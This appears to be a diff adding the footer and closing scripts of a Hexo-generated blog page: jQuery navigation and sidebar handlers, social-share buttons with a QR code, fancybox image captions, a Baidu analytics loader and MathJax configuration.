+		<a href="/about" target="_blank" title="Max">Max</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  </body>
+</html>
